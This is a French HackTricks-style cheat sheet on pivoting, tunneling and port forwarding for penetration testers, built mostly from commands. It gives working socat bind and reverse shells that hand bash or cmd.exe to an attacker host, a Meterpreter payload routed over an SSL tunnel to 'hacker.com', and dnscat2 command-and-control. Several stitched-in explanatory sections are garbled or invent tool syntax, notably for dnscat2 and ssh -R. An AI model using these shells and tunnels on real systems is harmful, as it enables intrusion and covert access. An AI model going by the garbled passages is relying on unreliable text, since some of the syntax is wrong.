# Tunneling et Port Forwarding

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Astuce Nmap

{% hint style="warning" %}
Les scans **ICMP** et **SYN** ne peuvent pas être tunnelisés via des proxies socks, donc nous devons **désactiver la découverte de ping** (`-Pn`) et spécifier des **scans TCP** (`-sT`) pour que cela fonctionne.
{% endhint %}

## **Bash**

**Hôte -> Saut -> InterneA -> InterneB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

Connexion graphique SSH (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Port local à port local

Ouvrez un nouveau port dans le serveur SSH --> Autre port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Port local --> Hôte compromis (SSH) --> Troisième\_boîte:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host 
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Port local --> Hôte compromis (SSH) --> N'importe où
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Transfert de port inverse

Ceci est utile pour obtenir des shells inverses à partir d'hôtes internes à travers une DMZ vers votre hôte:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems 
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Vous avez besoin de **root dans les deux appareils** (car vous allez créer de nouvelles interfaces) et la configuration sshd doit autoriser la connexion root:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
Activer la redirection côté serveur
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Créez une nouvelle route côté client
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
## SSHUTTLE

Vous pouvez **tunnéliser** tout le **trafic** vers un **sous-réseau** via un hôte en utilisant **ssh**.\
Par exemple, en redirigeant tout le trafic allant vers 10.10.10.0/24.
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
# Se connecter avec une clé privée

Lorsque vous vous connectez à un serveur distant, vous pouvez utiliser une clé privée pour vous authentifier. Cela est souvent plus sûr que d'utiliser un mot de passe, car les clés privées sont plus difficiles à deviner ou à intercepter.

Pour vous connecter à un serveur distant avec une clé privée, vous devez suivre les étapes suivantes :

1. Générez une paire de clés publique/privée sur votre machine locale si vous n'en avez pas déjà une. Vous pouvez utiliser la commande `ssh-keygen` pour cela.

2. Copiez la clé publique sur le serveur distant. Vous pouvez utiliser la commande `ssh-copy-id` pour cela.

3. Connectez-vous au serveur distant en utilisant la clé privée. Vous pouvez utiliser la commande `ssh` pour cela, en spécifiant le chemin de la clé privée avec l'option `-i`.

Voici un exemple de commande pour vous connecter à un serveur distant avec une clé privée :

```bash
ssh -i /chemin/vers/la/clé/privée utilisateur@serveur distant
```

Assurez-vous de remplacer `/chemin/vers/la/clé/privée`, `utilisateur` et `serveur distant` par les valeurs appropriées pour votre configuration.
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Port local --> Hôte compromis (session active) --> Troisième\_boîte:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS

SOCKS (Socket Secure) est un protocole de réseau qui permet aux applications de se connecter à un serveur proxy. Le serveur proxy agit comme un intermédiaire entre l'application cliente et le serveur de destination. SOCKS peut être utilisé pour contourner les pare-feux et les filtres de contenu, ainsi que pour masquer l'adresse IP de l'utilisateur. Les versions les plus courantes de SOCKS sont SOCKS4 et SOCKS5. SOCKS5 offre des fonctionnalités supplémentaires telles que l'authentification et la prise en charge de l'UDP.
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Une autre méthode:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### Proxy SOCKS

Ouvrez un port dans le serveur d'équipe en écoutant sur toutes les interfaces qui peuvent être utilisées pour **router le trafic à travers le beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

{% hint style="warning" %}
Dans ce cas, le **port est ouvert dans l'hôte beacon**, pas dans le serveur d'équipe et le trafic est envoyé au serveur d'équipe et de là à l'hôte:port indiqué.
{% endhint %}
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
À noter :

* La redirection de port inverse de Beacon **toujours tunnelise le trafic vers le serveur d'équipe** et le **serveur d'équipe envoie le trafic à sa destination prévue**, donc ne doit pas être utilisée pour relayer le trafic entre des machines individuelles.
* Le **trafic est tunnelisé à l'intérieur du trafic C2 de Beacon**, pas sur des sockets séparés, et fonctionne également sur des liens P2P.
* Vous **n'avez pas besoin d'être un administrateur local** pour créer des redirections de port inverse sur des ports élevés.

### rPort2Port local

{% hint style="warning" %}
Dans ce cas, le **port est ouvert dans l'hôte Beacon**, pas dans le serveur d'équipe et le **trafic est envoyé au client Cobalt Strike** (pas au serveur d'équipe) et de là à l'hôte:port indiqué.
{% endhint %}
```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Vous devez télécharger un tunnel de fichier web: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Vous pouvez le télécharger depuis la page des versions de [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Vous devez utiliser **la même version pour le client et le serveur**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Transfert de port

---

#### Introduction

Le transfert de port (port forwarding) est une technique qui permet de rediriger le trafic réseau d'un port spécifique d'une machine vers un autre port d'une autre machine. Cette technique est souvent utilisée pour contourner les restrictions de pare-feu ou pour accéder à des services qui ne sont pas directement accessibles depuis l'extérieur.

#### Local Port Forwarding

Le transfert de port local (local port forwarding) permet de rediriger le trafic d'un port local vers un autre port sur une machine distante. Cette technique est souvent utilisée pour accéder à des services qui ne sont pas directement accessibles depuis l'extérieur.

Pour mettre en place un transfert de port local, il suffit d'utiliser la commande suivante :

```
ssh -L <port_local>:<adresse_distante>:<port_distante> <utilisateur>@<adresse_distante>
```

#### Remote Port Forwarding

Le transfert de port distant (remote port forwarding) permet de rediriger le trafic d'un port distant vers un autre port sur une machine locale. Cette technique est souvent utilisée pour contourner les restrictions de pare-feu.

Pour mettre en place un transfert de port distant, il suffit d'utiliser la commande suivante :

```
ssh -R <port_local>:<adresse_distante>:<port_distante> <utilisateur>@<adresse_distante>
```

#### Dynamic Port Forwarding

Le transfert de port dynamique (dynamic port forwarding) permet de créer un tunnel SOCKS qui permet de rediriger le trafic de plusieurs ports vers une machine distante. Cette technique est souvent utilisée pour contourner les restrictions de pare-feu ou pour accéder à des services qui ne sont pas directement accessibles depuis l'extérieur.

Pour mettre en place un transfert de port dynamique, il suffit d'utiliser la commande suivante :

```
ssh -D <port_local> <utilisateur>@<adresse_distante>
```
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Tunnel inversé. Le tunnel est démarré depuis la victime.\
Un proxy socks4 est créé sur 127.0.0.1:1080.
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivoter via un proxy **NTLM**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Shell de liaison
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Shell inversé
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port à Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port via socks

---

Il est possible de faire du port forwarding à travers un proxy socks en utilisant la commande `socat`. 

La commande suivante permet de rediriger le trafic du port local `LOCAL_PORT` vers le port distant `REMOTE_PORT` via un proxy socks sur `SOCKS_PROXY_IP:SOCKS_PROXY_PORT`:

```
socat TCP-LISTEN:LOCAL_PORT,fork SOCKS4A:SOCKS_PROXY_IP:REMOTE_HOST:%REMOTE_PORT,socksport=SOCKS_PROXY_PORT
```

Il est important de noter que `REMOTE_HOST` doit être résolu par le proxy socks. Si ce n'est pas le cas, il est possible d'utiliser `socat` pour résoudre le nom d'hôte en utilisant la commande suivante:

```
socat TCP-LISTEN:LOCAL_PORT,fork EXEC:'bash -c "exec socat STDIO SOCKS4A:SOCKS_PROXY_IP:REMOTE_HOST:%REMOTE_PORT,socksport=SOCKS_PROXY_PORT"'
```

Dans ce cas, `REMOTE_HOST` sera résolu localement et le trafic sera redirigé vers le proxy socks.
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter via SSL Socat

---

Lorsque vous avez un accès limité à une machine, il peut être difficile d'obtenir un shell interactif. Cependant, si vous pouvez exécuter des commandes, vous pouvez utiliser `socat` pour créer un tunnel SSL vers une machine distante et exécuter un shell Meterpreter à travers ce tunnel.

1. Sur la machine distante, exécutez `msfvenom` pour générer un payload Meterpreter avec l'option `--platform` correspondant à la plateforme cible et l'option `--arch` correspondant à l'architecture cible. Par exemple, pour générer un payload pour une plateforme Windows x64, utilisez la commande suivante :

   ```
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<votre adresse IP> LPORT=<votre port> -f exe -o payload.exe
   ```

2. Transférez le fichier `payload.exe` sur la machine cible.

3. Sur la machine cible, exécutez la commande suivante pour créer un tunnel SSL vers une machine distante :

   ```
   socat openssl-connect:<votre adresse IP>:<votre port>,verify=0 exec:'cmd.exe',pty,stderr,setsid,sigint,sane
   ```

   Remplacez `<votre adresse IP>` et `<votre port>` par l'adresse IP et le port de la machine distante.

4. Sur la machine distante, exécutez Metasploit et utilisez le module `exploit/multi/handler` pour écouter les connexions entrantes :

   ```
   use exploit/multi/handler
   set PAYLOAD windows/x64/meterpreter/reverse_tcp
   set LHOST <votre adresse IP>
   set LPORT <votre port>
   run
   ```

5. Sur la machine cible, exécutez le fichier `payload.exe` pour établir une connexion avec la machine distante via le tunnel SSL.

6. Une fois la connexion établie, vous devriez avoir un shell Meterpreter interactif sur la machine distante.
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Vous pouvez contourner un **proxy non authentifié** en exécutant cette ligne à la place de la dernière dans la console de la victime:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
### Tunnel SSL Socat

**Console /bin/sh**

Créez des certificats des deux côtés : Client et Serveur.
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Port2Port à distance

Connectez le port SSH local (22) au port 443 de l'hôte attaquant.
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost 
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22 
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

C'est comme une version console de PuTTY (les options sont très similaires à un client ssh).

Comme ce binaire sera exécuté sur la victime et qu'il s'agit d'un client ssh, nous devons ouvrir notre service ssh et notre port afin que nous puissions avoir une connexion inverse. Ensuite, pour ne transférer que le port accessible localement vers un port de notre machine:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Vous devez être un administrateur local (pour n'importe quel port)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444 
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Vous devez avoir **un accès RDP sur le système**.\
Téléchargement :

1. [Binaires SocksOverRDP x64](https://github.com/nccgroup/SocksOverRDP/releases) - Cet outil utilise les `Dynamic Virtual Channels` (`DVC`) de la fonctionnalité Remote Desktop Service de Windows. DVC est responsable de **tunneliser les paquets sur la connexion RDP**.
2. [Binaire portable de Proxifier](https://www.proxifier.com/download/#win-tab)

Chargez **`SocksOverRDP-Plugin.dll`** sur votre ordinateur client comme ceci :
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Maintenant, nous pouvons nous **connecter** à la **victime** via **RDP** en utilisant **`mstsc.exe`**, et nous devrions recevoir une **invite** indiquant que le plugin **SocksOverRDP est activé**, et qu'il **écoutera** sur **127.0.0.1:1080**.

**Connectez-vous** via **RDP** et téléchargez et exécutez sur la machine de la victime le binaire **`SocksOverRDP-Server.exe`** :
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Maintenant, confirmez sur votre machine (attaquant) que le port 1080 est en écoute :
```
netstat -antb | findstr 1080
```
Maintenant, vous pouvez utiliser [**Proxifier**](https://www.proxifier.com/) **pour faire transiter le trafic via ce port.**

## Proxifier les applications GUI Windows

Vous pouvez faire naviguer les applications GUI Windows via un proxy en utilisant [**Proxifier**](https://www.proxifier.com/).\
Dans **Profil -> Serveurs Proxy**, ajoutez l'IP et le port du serveur SOCKS.\
Dans **Profil -> Règles de proxification**, ajoutez le nom du programme à proxifier et les connexions vers les IPs que vous souhaitez proxifier.

## Contourner le proxy NTLM

L'outil précédemment mentionné : **Rpivot**\
**OpenVPN** peut également le contourner, en définissant ces options dans le fichier de configuration :
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm s'authentifie auprès d'un proxy et lie un port en local qui est redirigé vers le service externe que vous spécifiez. Ensuite, vous pouvez utiliser l'outil de votre choix via ce port.\
Par exemple, cela peut rediriger le port 443.
```
Username Alice 
Password P@ssw0rd 
Domain CONTOSO.COM 
Proxy 10.0.0.10:8080 
Tunnel 2222:<attackers_machine>:443
```
Maintenant, si vous configurez par exemple sur la victime le service **SSH** pour écouter sur le port 443. Vous pouvez vous y connecter via le port 2222 de l'attaquant.\
Vous pouvez également utiliser un **meterpreter** qui se connecte à localhost:443 et l'attaquant écoute sur le port 2222.

## YARP

Un proxy inverse créé par Microsoft. Vous pouvez le trouver ici: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## Tunneling DNS

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Le root est nécessaire dans les deux systèmes pour créer des adaptateurs tun et tunneliser les données entre eux en utilisant des requêtes DNS.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Le tunnel sera très lent. Vous pouvez créer une connexion SSH compressée à travers ce tunnel en utilisant:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

****[**Téléchargez-le ici**](https://github.com/iagox86/dnscat2)**.**

Établit un canal C\&C via DNS. Il n'a pas besoin de privilèges root.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **En PowerShell**

Vous pouvez utiliser [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) pour exécuter un client dnscat2 en PowerShell :
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd 
```
#### **Transfert de port avec dnscat**

---

##### **Description**

Dnscat est un outil qui permet de transférer des données via des requêtes DNS. Il peut être utilisé pour contourner les pare-feux qui bloquent les connexions sortantes sur des ports spécifiques.

##### **Installation**

Dnscat est disponible sur [GitHub](https://github.com/iagox86/dnscat2) et peut être installé en suivant les instructions du dépôt.

##### **Utilisation**

Pour utiliser dnscat, il faut d'abord lancer un serveur sur une machine accessible depuis l'extérieur. Ensuite, il faut lancer un client sur la machine qui souhaite se connecter au serveur.

Pour lancer le serveur, il suffit d'exécuter la commande suivante :

```
dnscat2 --dns <domaine> --secret <secret>
```

Le paramètre `--dns` spécifie le domaine à utiliser pour les requêtes DNS. Ce domaine doit être configuré pour pointer vers l'adresse IP de la machine qui exécute le serveur.

Le paramètre `--secret` spécifie le secret à utiliser pour chiffrer les données transférées.

Une fois le serveur lancé, il est possible de se connecter à celui-ci depuis un client en utilisant la commande suivante :

```
dnscat2 --dns <domaine> --secret <secret>
```

Le client se connectera alors au serveur et pourra transférer des données via des requêtes DNS.

##### **Exemple**

Supposons que nous avons un serveur dnscat qui s'exécute sur `example.com` avec le secret `mysecret`. Pour transférer des données depuis la machine locale vers le serveur, nous pouvons utiliser la commande suivante :

```
echo "Hello, world!" | dnscat2 --dns example.com --secret mysecret
```

Les données seront alors transférées via des requêtes DNS et seront disponibles sur le serveur.
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Changer le DNS de proxychains

Proxychains intercepte l'appel libc `gethostbyname` et tunnelise la requête tcp DNS via le proxy socks. Par **défaut**, le serveur **DNS** que proxychains utilise est **4.2.2.2** (codé en dur). Pour le changer, éditez le fichier : _/usr/lib/proxychains3/proxyresolv_ et changez l'IP. Si vous êtes dans un environnement **Windows**, vous pouvez définir l'IP du **contrôleur de domaine**.

## Tunnels en Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## Tunneling ICMP

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Les privilèges root sont nécessaires dans les deux systèmes pour créer des adaptateurs tun et tunneliser les données entre eux en utilisant des demandes d'écho ICMP.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

****[**Téléchargez-le ici**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh 

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

**[ngrok](https://ngrok.com/) est un outil pour exposer des solutions sur Internet en une seule ligne de commande.**  
*Les URI d'exposition ressemblent à:* **UID.ngrok.io**

### Installation

- Créez un compte: https://ngrok.com/signup
- Téléchargez le client:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Utilisations de base

**Documentation:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

*Il est également possible d'ajouter une authentification et TLS, si nécessaire.*

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444 
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Exposition de fichiers avec HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing des appels HTTP

*Utiles pour XSS, SSRF, SSTI ...*  
Directement depuis stdout ou dans l'interface HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunnelisation d'un service HTTP interne
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### Exemple de configuration simple ngrok.yaml

Il ouvre 3 tunnels :
- 2 TCP
- 1 HTTP avec exposition de fichiers statiques depuis /tmp/httpbin/
```yaml
tunnels:
  mytcp:
    addr: 4444
    proto: tcp
  anothertcp:
    addr: 5555
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```
## Autres outils à vérifier

* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
